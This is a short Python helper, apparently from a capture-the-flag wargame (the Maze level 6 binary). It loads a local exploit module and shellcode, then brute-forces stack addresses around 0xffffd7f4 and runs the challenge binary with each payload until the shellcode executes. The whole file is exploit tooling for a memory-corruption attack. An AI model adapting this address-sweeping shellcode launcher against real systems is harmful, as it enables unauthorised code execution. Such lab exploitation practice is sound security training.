#!/usr/bin/env python3
"""Sweep with full rc pattern — find where the pivot lands."""
import subprocess, importlib.util

spec = importlib.util.spec_from_file_location("exploit", "/run/screen/l6/exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

sc = open("/run/screen/l6/sc.bin", "rb").read()
path = b"/run/screen/l6/wP.txt"

for delta in range(-0x100, 0x101, 4):
    buf = 0xffffd7f4 + delta
    try:
        pay = ex.build(buf, path, sc)
    except AssertionError:
        continue
    r = subprocess.run(["/maze/maze6", path, pay], capture_output=True)
    tag = "HIT" if r.stdout else ""
    print(hex(delta), hex(buf), "rc", r.returncode, tag, r.stdout[:30], flush=True)
print("done", flush=True)
